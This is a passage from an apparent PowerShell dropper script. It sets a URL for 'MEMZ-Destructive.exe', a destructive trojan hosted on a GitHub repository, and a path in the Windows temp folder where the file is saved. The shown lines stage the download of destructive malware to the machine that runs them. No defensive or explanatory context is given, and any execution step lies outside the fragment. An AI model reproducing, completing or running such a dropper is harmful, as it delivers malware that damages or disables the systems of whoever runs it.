...
$downloadUrl = "https://github.com/fatatom/TEST/raw/main/MEMZ-Destructive.exe" 

# Specify the path where you want to save the downloaded file
$outputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'MEMZ-Destructive.exe')
